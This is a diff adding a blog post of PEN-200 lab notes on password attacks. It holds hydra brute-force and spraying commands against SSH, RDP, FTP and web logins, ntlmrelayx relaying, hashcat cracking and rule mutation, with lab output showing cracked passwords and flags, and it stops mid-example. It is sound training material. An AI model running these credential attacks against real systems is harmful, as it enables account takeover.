@@ -1,0 +1,2979 @@
+---
+title: "PEN-200 Module 15 \u2014 Password Attacks That Still Work"
+slug: password-attacks
+author: m4xx3d0ut
+summary: Credential attacks blend automation with context. The lab notes captured
+  wordlists, hashcat rule tweaks, and relay nuances; this revision makes them explicit.
+publishedAt: '2023-09-29'
+updatedAt: '2023-10-06'
+readingMinutes: 84
+tags:
+- offsec
+---
+
+# PEN-200 Module 15 — Password Attacks That Still Work
+
+## TLDR;
+
+Credential attacks blend automation with context. The lab notes captured wordlists, hashcat rule tweaks, and relay nuances; this revision makes them explicit.
+
+### Online Guessing
+
+- Build user lists from LDAP, email headers, and OSINT; normalise casing and remove duplicates.
+- Respect lockout thresholds: throttle attempts (`hydra -t 4 -W 30`) and log timings.
+
+```
+# SSH brute force with delays
+hydra -L users.txt -P rockyou.txt -s 22 -V -W 15 ssh://192.168.119.37
+
+# HTTP form spraying (Burp → Intruder capture first)
+ffuf -X POST -d "username=FUZZ&password=Winter2024!" -H "Content-Type: application/x-www-form-urlencoded" -w users.txt -u https://portal.acme.local/login -mr "Welcome"
+```
+
+- Capture successes with timestamp, source IP, account type, and password reuse indicators.
+
+### Hash Capture & Cracking
+
+- Dump credentials responsibly (`secretsdump.py`, `impacket` relays, DPAPI extraction). Store raw files in encrypted containers.
+- Use targeted wordlists plus rules:
+
+```bash
+hashcat -m 1000 hashes/ntlm.txt wordlists/rockyou.txt -r rules/dive.rule --session ntlm
+hashcat -m 5600 hashes/netntlmv2.txt wordlists/top20k.txt -r rules/leetspeak.rule --status
+```
+
+- Leverage masks (`?u?l?l?l?d?d?d`) for seasonal patterns. Document masks used and cracked credentials for reporting.
+
+### Relay & Pass-The-Hash
+
+- **Responder / Inveigh** to capture Net-NTLMv2.
+- **ntlmrelayx.py** to target SMB/HTTP services lacking signing or enforcing Extended Protection.
+
+```bash
+python3 ntlmrelayx.py -tf targets.txt -smb2support --escalate-user supportsvc
+```
+
+- After success, enumerate new privileges (`net localgroup administrators`, `Get-ADGroupMember`). Note lateral movement paths you unlocked.
+
+### SSH Key & Password Manager Workflows
+
+- Convert private keys: `ssh2john id_rsa > ssh.hash`, crack with `john --wordlist=... --rules=KoreLogic`.
+- For KeePass/Password Safe artifacts, use `keepass2john` and mention key-file requirements in the notes.
+
+### Operational Hygiene
+
+- Segregate cracked credentials by sensitivity (user, service, privileged) and update the engagement tracker.
+- Purge loot post-engagement per policy; document deletion commands for audit.
+
+### Defensive Recommendations
+
+- Enforce MFA, disable legacy auth protocols, and deploy account lockout alerting.
+- Rotate captured credentials immediately; note whether the client already has PAM or SSPR solutions to support this.
+- Roll out LAPS / gMSA to prevent local admin password reuse.
+
+Module 15 proves passwords remain the weakest link—apply these workflows carefully, log everything, and hand defenders a prioritized remediation list.
+
+## Working Notes... In Graphic Detail...
+
+### Password Attacks
+
+- Attacking network services logins.
+- Password Cracking Fundamentals.
+- Working with Password Hashes.
+
+#### 15.1 Attacking Network Services Logins
+ 
+- Attack SSH and RDP logins.
+- Attack HTTP POST login forms.
+
+##### SSH and RDP
+
+- Execute a Dictionary attack against SSH and RDP.
+ - Tool; THC Hydra.
+	- Wordlist; `rockyou.txt`
+  - Contains 14M passwords.
+
+As an example we will brute our first test VM.  We will attack ssh on port 2222 and attempt to determine the password for the user `george`.
+
+- Confirm the target is running SSH on port 2222.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ sudo nmap -sV -p 2222 192.168.241.201            
+[sudo] password for operator: 
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 09:12 PDT
+Nmap scan report for 192.168.241.201
+Host is up (0.079s latency).
+
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
+```
+- The output indicates that SSH is open.
+- Let's assume through information gathering we already discovered the `george` user.
+	- *The format of the user name may suggest that the company uses the first name for account names. This information can assist us later to further our efforts.
+-  Once we have prepared the `rockyou.txt` by decompressing it.
+	-  attack with a single username `-l george`
+	-  specify the port with `-s 2222`
+	-  set password list with `-P /usr/share/wordlists/rockyou.txt`
+	-  define target with `ssh://192.168.241.201`
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.241.201
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 09:34:36
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.241.201:2222/
+[2222][ssh] host: 192.168.241.201   login: george   password: chocolate
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 09:34:46
+```
+- We have successfully discovered a valid login for `george`
+- The dictionary attack worked because the password was contained in the `rockyou.txt` wordlist.
+- If we don't have a valid username.
+ - We would use enumeration and information gathering techniques.
+ - We can also attack built in accounts.
+  - On Linux `root`
+  - On Win `Administrator`
+
+In the next example we will use the **password spraying** technique to use a single password against multiple usernames.
+*This technique is extremely viable due to the number of ways we can gain access to passwords.  We may gain access to credentials using one of the techniques described later in this module, find the stored in plain text, or through online leak DBs.  Services like ScatteredSecrets track password leaks, compromise, and sell plaintext passwords.  This can be beneficial during a pentest, but we must assure we don't violate the ToS of these services and only use passwords in cooperation with the legal owner.  Always review the service to determine if it is operating legally.  As an example, WeLeakInfo was recently seized by the FBI and US DoJ for alleged illegal activity.
+
+- We will demonstrate this by executing a password spray against out second test VM.
+- Using `hydra`
+ - Set the list of usernames `-L /usr/share/wordlists/dirb/others/names.txt`
+  - Contains over 8000 usernames.
+ - Set single password `-p "SuperS3cure1337#"`
+ - Using RDP proto `rdp://192.168.241.202`
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hydra -L name.lst -p "SuperS3cure1337#" rdp://192.168.241.202 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 13:35:00
+[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:2/p:1), ~1 try per task
+[DATA] attacking rdp://192.168.241.202:3389/
+[3389][rdp] host: 192.168.241.202   login: daniel   password: SuperS3cure1337#
+[3389][rdp] host: 192.168.241.202   login: justin   password: SuperS3cure1337#
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 13:35:12
+```
+- In this case we discover two usernames with the password we discovered in the DB leak.
+- This can reveal users with the same password across multiple systems.
+- We should always try to leverage every password we discover by spraying them across target systems.
+ - Always use caution with broad-range attacks.
+ - Dict attacks generate a lot of noise.
+ - Huge amounts of traffic can bring down a network.
+ - Basic brute force protection programs can lock user accounts after 3 attempts.
+  - Possibly locking users out of critical production systems IRL pentest.
+
+
+###### Exercises
+
+Follow the steps outlined in this section to leverage a dictionary attack to get access to SSH (port 2222) on VM #1 (BRUTE). Find the flag in the george user's home directory.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ ssh -o PubKeyAuthentication=no george@192.168.241.201 -p 2222  
+george@192.168.241.201's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.15.0-50-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+george@9195ad6f4213:~$ ls
+flag.txt
+george@9195ad6f4213:~$ cat flag.txt 
+OS{0ad2f862efd3098af6de9ece0d8ff6f7}
+```
+
+Enumerate VM #3 (BRUTE2) and find another network service. Use the knowledge from this section to get access as the itadmin user and find the flag.
+```
+# Enumerate services
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ sudo nmap -sS -T 5 -p 1-65355 192.168.241.202
+[sudo] password for operator: 
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 13:47 PDT
+Warning: 192.168.241.202 giving up on port because retransmission cap hit (2).
+Nmap scan report for 192.168.241.202
+Host is up (0.076s latency).
+Not shown: 65313 closed tcp ports (reset), 26 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+21/tcp    open  ftp
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+8000/tcp  open  http-alt
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49671/tcp open  unknown
+
+
+# Brute force user `itadmin` on FTP port 21
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hydra -l itadmin -P /usr/share/wordlists/rockyou.txt -s 21 ftp://192.168.241.202
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 14:04:50
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://192.168.241.202:21/
+[21][ftp] host: 192.168.241.202   login: itadmin   password: hellokitty
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 14:04:57
+
+
+# Retrieve the flag via FTP
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ ftp itadmin@192.168.241.202 -P 21 
+Connected to 192.168.241.202.
+220-FileZilla Server 1.4.1
+220 Please visit https://filezilla-project.org/
+331 Please, specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||50469|)
+150 Starting data transfer.
+-rw-rw-rw- 1 ftp ftp             282 Jun 09  2022 desktop.ini
+-rw-rw-rw- 1 ftp ftp              38 Sep 30 20:45 flag.txt
+226 Operation successful
+ftp> help
+Commands may be abbreviated.  Commands are:
+
+!		epsv6		mget		preserve	sendport
+$		exit		mkdir		progress	set
+account		features	mls		prompt		site
+append		fget		mlsd		proxy		size
+ascii		form		mlst		put		sndbuf
+bell		ftp		mode		pwd		status
+binary		gate		modtime		quit		struct
+bye		get		more		quote		sunique
+case		glob		mput		rate		system
+cd		hash		mreget		rcvbuf		tenex
+cdup		help		msend		recv		throttle
+chmod		idle		newer		reget		trace
+close		image		nlist		remopts		type
+cr		lcd		nmap		rename		umask
+debug		less		ntrans		reset		unset
+delete		lpage		open		restart		usage
+dir		lpwd		page		rhelp		user
+disconnect	ls		passive		rmdir		verbose
+edit		macdef		pdir		rstatus		xferbuf
+epsv		mdelete		pls		runique		?
+epsv4		mdir		pmlsd		send
+ftp> recv flag.txt
+local: flag.txt remote: flag.txt
+229 Entering Extended Passive Mode (|||50471|)
+150 Starting data transfer.
+100% |********************************************|    38      545.72 KiB/s    00:00 ETA
+226 Operation successful
+38 bytes received in 00:00 (263.18 KiB/s)
+ftp> exit
+221 Goodbye.
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ ls
+flag.txt  name.lst
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat flag.txt 
+OS{67bcc9f27bf56dbb9dca5cae55c80e30}
+```
+
+
+##### HTTP POST Login Form
+
+During most assessments we will face a web service, often requiring login before we can interact.  If this is the only present vector and default creds fail, we should consider a dict attack.
+
+Most web services have a default user account, i.e. `admin`, which we can use in the dict attack to increase our odds of success while also reducing attack duration.
+
+In this example, we will perform a dict attack on the login form of a TinyFileManager app.
+
+- Start with the app docs.
+ - TinyFileManager.
+  - Includes 2 def user accounts.
+			- `admin`
+			- `user`
+- We will target `user` with the `rockyou.txt` wordlist using `hydra`
+ - To target HTTP POST with Hydra we need 2 pieces of info.
+  - The POST data.
+   - Containing the request body which specifies username and password.
+		- We must also capture a failed login attempt so Hydra can differentiate between successful and failed login attempts.
+- Use Burp to intercept a login attempt.
+ - Record the request body in the POST data.
+```http
+POST / HTTP/1.1
+Host: 192.168.241.201
+Content-Length: 23
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.241.201
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.241.201/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: filemanager=u1k19t8td1q7fsbpmjjb91g6a5
+Connection: close
+
+fm_usr=test&fm_pwd=test
+```
+- POST data.
+	- `fm_usr=test&fm_pwd=test`
+- We find a text string that appears in a failed login attempt GET.
+	- `Login failed. Invalid username or password`
+ - *In more complex web applications, we may need to dig deeper into the request and response or even inspect the source code of the login form to isolate a failed login indicator, but this is out of the scope of this Module.*.
+- Now we can set the options of our Hydra attack.
+ - Set user `-l`
+ - Set wordlist `-P`
+ - Set target IP without protocol.
+	- POST form arg `http-post-form`
+  - Accepts 3 colon-delimited fields.
+			- Location of login form `index.php`
+   - Request body providing username and password.
+   - Failed login identifier aka the **condition string**.
+    - The condition string is searched for in the response.
+    - Try to avoid keywords like `password` or `username`
+     - Modify the condition string as needed.
+- Launch our Hydra attack.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.241.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 18:34:55
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://192.168.241.201:80/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid
+[STATUS] 66.00 tries/min, 66 tries in 00:01h, 14344333 to do in 3622:19h, 16 active
+[80][http-post-form] host: 192.168.241.201   login: user   password: 121212
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 18:37:21
+```
+- Our attack was succesful.
+ - Password of `user` is `121212`
+ - We can confirm by logging in.
+- Always be aware *dict attacks make a lot of noise!*.
+ - If present, a WAF would block.
+ - Other brute force mitigations would as well.
+  - Fail2ban.
+	- This is a highly effective vector, as web apps are no often protected with such measures.
+
+Dict attacks can be highly effective if we begin with known info and take possible countermeasures into consideration.
+
+###### Excersizes
+
+The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user admin. Once you have identified the correct password, enter it as answer to this exercise.
+```
+# Enumerate the running web server
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ sudo nmap -sV -p 80 192.168.241.201
+[sudo] password for operator: 
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 19:05 PDT
+Nmap scan report for 192.168.241.201
+Host is up (0.075s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41
+Service Info: Host: 172.25.0.2
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds
+
+
+# Craft attack using http-get method for Apache HTTP GET basic authentication
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.241.201 http-get /
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 19:12:50
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-get://192.168.241.201:80/
+[80][http-get] host: 192.168.241.201   login: admin   password: 789456
+[STATUS] attack finished for 192.168.241.201 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 19:12:54
+
+
+# Log in using admin:789456 success!
+```
+
+
+#### 15.2 Password Cracking Fundamentals
+
+- Understand the fundamentals of password cracking.
+- Mutate wordlists.
+- Explain the basic password cracking methodology.
+- Attack password manager key files.
+- Attack the passphrase of SSH private keys.
+
+##### Introduction to Encryption, Hashes and Cracking
+
+We will examine the difference between encryption and hash algorithms as well as discuss password cracking.  We will review two popular password cracking tools:
+- [Hashcat](https://hashcat.net/hashcat/)
+- [John the Ripper (JtR)](https://www.openwall.com/john/)
+Finally we will calculate the time it takes to crack specific hashes!
+
+**Encryption** is a two-way function.  Data is scrambled, i.e. encrypted, and unscrambled, i.e. decrypted with at least one key.  The encrypted data is known as [ciphertext](https://en.wikipedia.org/wiki/Ciphertext)
+
+- [Symmetric Encryption](https://en.wikipedia.org/wiki/Symmetric-key_algorithm)
+ - Use the same key for enc and dec.
+  - To send a message to another person both sides need to know the key (password)
+  - If the key is sent via unsecure channel, it can be intercepted.
+   - In this case, the attacker can use a MitM attack to access the encrypted message between the two.
+   - With an intercepted key and access to the encrypted message the attacker can decrypt and read.
+   - This introduces risk as the comm sec is reliant on knowledge of the key, which must be known by both sides before starting the comm.
+			- An example is [AES (Advanced Encryption Standard)](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
+- [Asymmetric Encryption](https://en.wikipedia.org/wiki/Public-key_cryptography)
+ - Uses distinct key pairs.
+  - Private and public key.
+ - To recieve a message the user shares their pub key with the comm partner.
+  - The pub key is used for the comm partner to enc their message to the user.
+  - Only the corresponding priv key can dec the message.
+		- An example is [RSA (Rivest-Shamir-Adleman)](https://en.wikipedia.org/wiki/RSA_(cryptosystem))
+
+**Hash**, or a digest, is the result of running var sized input data, such as a plaintext password, through a hash algorithm.
+- [SHA1](https://en.wikipedia.org/wiki/SHA-1)
+- [MD5](https://en.wikipedia.org/wiki/MD5)
+The result is a fixed-len hexadecimal value which represents the original plaintext input.  Plaintext run through the same hash algo always produces the same hash, which is statistically unique.  The only exception being an extremely rare [hash collision](https://en.wikipedia.org/wiki/Hash_collision), where two input values result in the same hash value.
+
+The majority of common hash algos, i.e. SHA1 and MD5, are cryptographic hash functions.  They are [one-way finctions](https://en.wikipedia.org/wiki/One-way_function), trivial to generate but prohibitively difficult to reverse to plaintext from the hash.  We will focus on cryptographic hash functions primarily.
+
+Hashing is leveraged in infosec.  When a user registers an account and sets a password, the password is typically hashed and stored in a DB.  This prevents the site admin (or an attacker) from accessing the plaintext password.
+
+During login, the supplied password is hashed and compared to the hash in the DB.  If the match, the password is correct.
+
+App and user passwords are more often than not encrypted or hashed for protection.  To dec an enc password we need to determine the key used to enc.  To determine the plaintext of a hash we must run plaintext passwords through the hash algo and compare the returned hash to the target hash.  **Password cracking** attacks are typically performed on a dedicated system, it is time consuming and should run in parralell with other actions during a pentest.
+
+Unlike dict attacks, password cracking is quiet, doesn not lock accounts by failed attempts, and is unaffected by countermeasures.
+
+Example, if we gain access to a [SHA-256](https://en.wikipedia.org/wiki/SHA-2) password hash with value:
+```
+5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6
+```
+We can use `sha256sum` to hash password attempts and compare the results.  If we hash `secret` twice and `secret1`, using `echo -n` to strip the newline (which would be added to the string, modifying the hash) we can see that the two `secret` hashes are the same.  The `secret1` hash is completely different, despite the similar input, showing us that plaintext `secret1` is not associated with the first hash.
+```bash
+kali@kali:~$ echo -n "secret" | sha256sum
+2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -
+
+kali@kali:~$ echo -n "secret" | sha256sum
+2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -
+
+kali@kali:~$ echo -n "secret1" | sha256sum
+5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6  -
+```
+This is sufficient for us to understand the process, but unwieldy in execution.  There are tools available to us for streamlining the process, two of the most popular are:
+- Hashcat.
+ - Mainly GPU based tool.
+  - Requires.
+			- [OpenCL](https://en.wikipedia.org/wiki/OpenCL)
+			- [CUDA](https://developer.nvidia.com/cuda-toolkit)
+ - Also supports CPU.
+- JtR.
+ - CPU based tool.
+ - Also supports GPU.
+GPU cracking is much faster than CPU, since GPUs contain thousands of cores to distribute the workload.  Note that some slow hash algos, like [bcrypt](https://en.wikipedia.org/wiki/Bcrypt), work better on CPU.  Both tools are important to learn, they support different algos.
+
+Before we begin, we can calculate the cracking time of various hashes by dividing the [keyspace](https://www.hypr.com/security-encyclopedia/key-space) with the hash rate.  The keyspace consists of the char set to the power of the len of the plaintext input.
+- Keyspace example.
+ - Lower-case latin: 26 chars.
+ - Upper-case latin: 26 chars.
+ - Numbers 0-9: 10 chars.
+ - Result 62 variations for each plaintext char.
+  - A 5 char password = 62^5 possible passwords.
+   - 916132832 possibilities.
+```bash
+kali@kali:~$ echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
+62
+
+kali@kali:~$ python3 -c "print(62**5)"
+916132832
+```
+- Hashrate example.
+ - How many calculations per second.
+ - We can find this with Hashcats benchmark mode.
+  - We will concentrate on MD5, SHA1, SHA-256 for this example.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -b
+hashcat (v6.2.6) starting in benchmark mode
+
+Benchmarking uses hand-optimized kernel code by default.
+You can use it in your cracking session by setting the -O option.
+Note: Using optimized kernel code limits the maximum supported password length.
+To disable the optimized kernel code in benchmark mode, use the -w option.
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-1185G7 @ 3.00GHz, 14844/29752 MB (4096 MB allocatable), 8MCU
+
+Benchmark relevant options:
+===========================
+* --optimized-kernel-enable
+
+-------------------
+* Hash-Mode 0 (MD5)
+-------------------
+
+Speed.#1.........:  1358.8 MH/s (5.77ms) @ Accel:1024 Loops:1024 Thr:1 Vec:16
+
+----------------------
+* Hash-Mode 100 (SHA1)
+----------------------
+
+Speed.#1.........:   568.9 MH/s (14.51ms) @ Accel:1024 Loops:1024 Thr:1 Vec:16
+
+---------------------------
+* Hash-Mode 1400 (SHA2-256)
+---------------------------
+
+Speed.#1.........:   240.0 MH/s (34.80ms) @ Accel:1024 Loops:1024 Thr:1 Vec:16
+```
+- The values are in MH/s.
+ - 1 MH/s == 1,000,000 hashes per second.
+- We can run the benchmark on GPU.
+```powershell
+C:\Users\admin\Downloads\hashcat-6.2.5>hashcat.exe -b
+hashcat (v6.2.5) starting in benchmark mode
+...
+* Device #1: NVIDIA GeForce RTX 3090, 23336/24575 MB, 82MCU
+
+Benchmark relevant options:
+===========================
+* --optimized-kernel-enable
+
+-------------------
+* Hash-Mode 0 (MD5)
+-------------------
+
+Speed.#1.........: 68185.1 MH/s (39.99ms) @ Accel:256 Loops:1024 Thr:128 Vec:8
+
+----------------------
+* Hash-Mode 100 (SHA1)
+----------------------
+
+Speed.#1.........: 21528.2 MH/s (63.45ms) @ Accel:64 Loops:512 Thr:512 Vec:1
+
+---------------------------
+* Hash-Mode 1400 (SHA2-256)
+---------------------------
+
+Speed.#1.........:  9276.3 MH/s (73.85ms) @ Accel:16 Loops:1024 Thr:512 Vec:1
+```
+- Note the speed advantage of GPU.
+
+- Calculate a SHA256 cracking time.
+ - Keyspace 62^5 = 916,132,832.
+ - Hashrate = X MH/s * 1,000,000.
+ - Output in seconds.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ python                                
+Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> hacktop = 1000000 * 240
+>>> print(hacktop)
+240000000
+>>> keyspace = 916132832
+>>> print(keyspace / hacktop)
+3.8172201333333335
+>>> gpu = 1000000 * 9276.3
+>>> print(gpu)
+9276300000.0
+>>> print(keyspace / gpu)
+0.09876058687192092
+```
+- The calculations show we can calculate the entire keyspace of a 5 char password SHA256 in:
+ - CPU: 3.8 seconds.
+ - GPU: 0.1 seconds.
+- If we scale this up to 8 and 10 char password SHA256.
+```
+>>> keyspace = 62**8
+>>> print(keyspace / gpu)
+23537.41314801117
+>>> keyspace = 62**10
+>>> print(keyspace / gpu)
+90477816.14095493
+```
+- When converted from seconds the GPU will take.
+ - 6.5 hours to calculate they keyspace of the 8 char password.
+	- 2.8 years for the 10 char!
+- Increasing password length, increases cracking time exponentially.
+
+##### Mutating Wordlists
+
+Strong password policies dictating min len, char derivations, special chars, and num vals have become prevalent in recent years.  Most passwords found in common word lists will not suffice.  When attacking a target with strong policy we need to prepare the wordlist for such situations.  Once option is to mutate the passwords.
+- [rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
+ - Individual rules are implemented through rule functions.
+  - Modify existing passwords contained in the wordlist.
+ - An individual rule consists of one or more rule functions.
+  - Multiple rule functions will often be used in each rule.
+- To leverage we must craft a rule file.
+ - Supplied to cracking tool.
+ - Basic example.
+  - Rule function that appends fixed chars to all passwords in a word list.
+  - Modifies various chars.
+
+*Note that is does increase the size of wordlists dramatically, good cracking hardware is important, most can handle passwords with less than 8 chars easily.*
+
+For this example:
+- Password policy.
+ - Upper case letter.
+ - Special char.
+ - Num val.
+- We can check the first 10 passwords of `rockyou.txt` to determine if they fit this requirement.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ head /usr/share/wordlists/rockyou.txt  
+123456
+12345
+123456789
+password
+iloveyou
+princess
+1234567
+rockyou
+12345678
+abc123
+```
+- None of the first 10 passwords comply to the policy.
+ - We could use a rule function to mutate the passwords to fit the policy, but first we will familiarize with rule functions and how to use them on a basic example before applying to a complex wordlist.
+
+- Copy the first 10 passwords of `rockyou.txt` to `demo.txt`
+- Remove all number sequences which don't fit the password policy.
+ - Use `sed`
+ - Edit in place `-i`
+ - Lines starting with 1 `^1`
+ - Delete with `d`
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ head /usr/share/wordlists/rockyou.txt > demo.txt
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ sed -i '/^1/d' demo.txt 
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat demo.txt 
+password
+iloveyou
+princess
+rockyou
+abc123
+```
+- We now have 5 passwords that we will mutate to fit the policy.
+- [Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
+ - List of all rule functions with examples.
+ - If we want to add a char.
+  - `$` function appends.
+  - `^` function prepends.
+  - Both expect on char after the function.
+   - Example, prepend 3 to every password in a file.
+    - The rule function is `^3`
+- When generating a password with a num val, many users simple at 1 to the end.
+ - Therefore we will use rule function `$1` .
+  - Create `demo.rule` with this function.
+   - Escape the special char `$` to echo it correctly.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo \$1 > demo.rule
+```
+- Now we can use Hascat with our wordlist mutation.
+ - Provide rule file with `-r`
+ - And `--stdout` to display mutated passwords in debug mode.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -r demo.rule --stdout demo.txt 
+password1
+iloveyou1
+princess1
+rockyou1
+abc1231
+```
+- Now for the uppercase char policy req.
+- When forced to use and upper case, many users capitalize the first letter.
+ - Therefore we will use the `c` rule function to cap the first char and convert the rest to lower.
+ - When using multiple rules.
+  - If rules are on the same line sep by space.
+   - Hashcat uses them consecutively on each password.
+    - Resulting in cap first char and 1 appended.
+  - If rules are on sep lines.
+   - Hashcat will use each rule separately.
+    - Resulting in two mutated passwords for each password in the list.
+```bash
+kali@kali:~/passwordattacks$ cat demo1.rule     
+$1 c
+       
